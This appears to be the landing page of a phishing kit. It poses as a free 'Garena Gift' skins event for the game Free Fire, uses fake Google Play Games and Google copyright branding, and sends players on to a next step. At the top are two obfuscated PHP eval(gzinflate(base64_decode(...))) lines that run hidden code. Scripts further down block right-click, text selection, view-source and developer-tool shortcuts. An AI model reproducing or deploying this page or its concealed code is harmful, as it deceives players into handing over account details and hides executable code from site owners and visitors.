<!-- https://www.rabiitch.ga/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
<?php eval(gzinflate(base64_decode('jY9La8JAEMfvgXyHYRE2lvgolFISBG1NwYN9xNiLyLJNVnfbbBJ2J6Df3k2lYm89Dczv/5iZqkoxKzCgdYtNi+yz3e2EUdWehjDuxzC9CAplm5IfmTCmNvaMfc8hhkoLViqtMOgsF4cWujbHM3F6en+3pI5LwQthAvpUVygqHGTHRkS+h+KAI4m6jCGX3LiEyTp7Hjx0lh62Xy2vNFclTIB+i7xFza2St+PpvtsO81pTpzuwhqP0vQkQidhEoxGBIfTYKkk/knRDz5O9zJYJ3f4hafK+TlYZW6cLunWP9RphecV4KQy6TrJTh994iBq4WbzBrCiMsBYi2ICrcZ6rtOVrlrDZfJ7+9BDYkhi6S4OrX0LfIyl/VApzSUK4rgyB/Cu0H58A'))); ?>
<?php eval(gzinflate(base64_decode('c0jOL6jUcFCJd/P0cQ2OVq9Qj41WL8ktiM9LzE1Vj9VBk4GIaloDAA=='))); ?>
<!DOCTYPE html>
<html>
  
<!-- Mirrored from clashofclanstournament.zxc.pm/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 03 Feb 2017 08:25:15 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta property="og:image" content="gw.html">
<link rel="icon" href="http://freefiremobile-a.akamaihd.net/ffwebsite/images/freefire32-2.ico" type="image/x-icon" />
<title>GARENA GIFT - FREE FIRE SKINS</title>
    <meta name="description" content="Get New Card From SUPERCELL and get the biggest prize in 2017.">
<script src="jquery.min.js"></script>
<style type="text/css">@import url(bootstrap.min.css);</style>

<style>
h1, .h1, h2, .h2, h3, .h3 {
    margin-top: 0px;
    margin-bottom: 10.5px;
}
body { 
  background: url(http://freefiremobile-a.akamaihd.net/ffwebsite/images/wallpaper/pop/019.jpg) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
.error-msg {
    margin: .5em 0;
    display: block;
    color: #dd4b39;
    line-height: 17px;
}
.col-md-6 {
 margin:0 auto;
 float:none;

}
.col-md-8 {
 margin:0 auto;
 float:none;

}
</style>



<!-- Kode menampilkan peringatan untuk mengaktifkan javascript-->
</head><body style="padding-top: 0px; padding-right: 0px; padding-bottom: 0px; padding-left: 0px; margin-top: 0px; margin-right: auto; margin-bottom: 0px; margin-left: auto; cursor: default;"><div align="center"><noscript>
<div style="position:fixed; top:0px; left:0px; z-index:3000; height:100%; width:100%; background-color:#FFFFFF">
<div style="font-family: Arial; font-size: 17px; background-color:#00bbf9; padding: 11pt;"> Mohon aktifkan javascript pada browser untuk mengakses halaman ini! </div></div>
</noscript></div>
<!--Kode untuk mencegah seleksi teks, block teks dll.-->
<script type="text/javascript">
function disableSelection(e){if(typeof e.onselectstart!="undefined")e.onselectstart=function(){return false};else if(typeof e.style.MozUserSelect!="undefined")e.style.MozUserSelect="none";else e.onmousedown=function(){return false};e.style.cursor="default"}window.onload=function(){disableSelection(document.body)}
</script>
<!--Kode untuk mematikan fungsi klik kanan di blog-->
<script type="text/javascript">
function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn
</script>
<style type="text/css">
* : (input, textarea) {
    -webkit-touch-callout: none;
    -webkit-user-select: none;
}
</style>
<style type="text/css">
img {
-webkit-touch-callout: none;
-webkit-user-select: none;
}
</style>
<!--Kode untuk mencegah shorcut keyboard, view source dll.-->
<script type="text/javascript">
window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}
</script>
<script type="text/javascript">
document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==18){return false}}
</script>

<body style="padding:0px;margin:0 auto;">
<div style="padding:0px;margin:0 auto;" class="container ">

<div style="border:none;padding:0px;margin:0 auto;" class="col-md-6">
<div style="border:none;padding:0px;margin:0px;" class="well well-sm">
<img style="border:none;width:100%;max-height:270px;margin:0 auto;" src="http://freefiremobile-a.akamaihd.net/ffwebsite/images/wallpaper/pop/001.jpg"/>
<div style="border:none;" class="btn btn-success btn-lg btn-block"><b><i class="fa fa-google-plus"></i> Google Play Games</b></div>
</div>
<center style="background:white;"><br>
<div class="col-md-8">




<div style="padding:30px;border-radius: 2px;box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);background:#f7f7f7;width:100%" class="form-horizontal"><img src="img/logo.png" width="80px" height="85px">
<br>
<form action="reminder.html" method="POST">

<center><font color="red">Hi! Player </center>
<center><font color="red">Welcome to Free Fire Events</font></center>
<center><font color="red">Click NEXT to continue the next Step</font></center>
<br>
<br>
<div style="width:100%" class="form-group">
  <input type="submit" name="gsubmit" class="btn btn-block" style="color: #ffffff;background-color: #2780e3;" id="gsubmit" value="NEXT"> </form>
 
</div></div>
<div style="height:110px;color: #737373;background-color: #f7f7f7;" class="btn btn-block">
<center><p>One Google Account for everything Google </p></center>
<img src="https://ssl.gstatic.com/accounts/ui/wlogostrip_230x17_1x.png"/>
<p>Copyright &copy; 2018 Google Inc.</p>
</div>